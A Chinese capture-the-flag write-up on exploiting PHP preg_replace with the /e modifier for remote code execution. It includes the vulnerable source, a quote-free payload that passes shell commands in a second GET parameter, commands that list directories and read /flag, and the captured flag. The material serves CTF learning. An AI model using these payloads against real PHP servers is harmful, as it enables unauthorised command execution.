# WP · qsnctf 40825 — preg_replace /e 修饰符 RCE（引号转义绕过）

> 分类：04-RCE与命令注入 ｜ 栈：nginx/1.14.2 + PHP/5.6.40 ｜ 难度：入门（开卷 + 经典老洞）
> 地址：`http://challenge.qsnctf.com:40825/`
> **Flag：`flag{dfd182e6ea444a1b9eb15e867c7c68ff}`**

---

## 0. 一句话思路
`preg_replace("/(.*)/e", "\\1", $input)` 的 `/e` 修饰符会把替换串当 **PHP 代码执行** → `?data=任意代码` = RCE。引号会被转义 → 用 `$_GET[1]` 当参数通道传命令。

## 1. 漏洞点（开卷源码）
```php
$input = $_GET['data'];
echo preg_replace("/(.*)/e", "\\1", $input);
```
- `/e` 修饰符（PHP 5.5 起弃用、**PHP 7 移除**，本题 5.6.40 还在）：替换串 `\1`（= 正则捕获的整段输入）**先替换再当 PHP eval**。
- 效果：我们输入什么，就执行什么 PHP 代码。

## 2. 踩坑：引号被转义
直接 `?data=system('ls /')` 会报错：
```
Parse error: unexpected ''ls /\');;' ... 
Failed evaluating code: system(\'ls /\');
```
`/e` 求值时把单引号转义成了 `\'` → PHP 语法错误。**payload 里不能有引号**。

## 3. 绕过：用 $_GET 当参数通道（无引号 payload）
```bash
# data 里不带引号，命令放第二个参数
?data=system($_GET[1]);&1=cat /flag
```
- `data` 的值 `system($_GET[1]);` 没有任何引号 → 求值成功；
- `$_GET[1]` 取第二个参数当命令 → 命令随便换。

## 4. 利用全流程
```bash
# 验证 RCE
?data=system($_GET[1]);&1=ls /
# 找 flag
?data=system($_GET[1]);&1=find / -iname "*flag*"
# → /flag
# 读 flag
?data=system($_GET[1]);&1=cat /flag
```
```
flag{dfd182e6ea444a1b9eb15e867c7c68ff}
```

## 5. 复盘 & 套路沉淀
1. **`preg_replace` + `/e` = 代码注入点**：看到 `/e` 修饰符直接当 eval 处理（PHP 7 已删，遇到就是老版本题）。
2. **引号转义坑的通用解法**：payload 里要传"带引号/带空格"的参数时，用 `$_GET[1]` / `$_POST[1]` 通道把参数拆到另一个参数里——**payload 本体保持无引号**。这个技巧在 eval/assert 类 RCE 题里通用。
3. **`ls` 输出别看 tail 看 head**：根目录 `/flag` 按字母序在 `media` 前面，我用 `tail -12` 把第一行截掉了，差点漏掉——列目录用 `head` 或完整输出。
4. 同类家族：`preg_replace /e`、`assert()`、`eval()`、`create_function()` 都是"字符串当代码执行"，看到即 RCE。
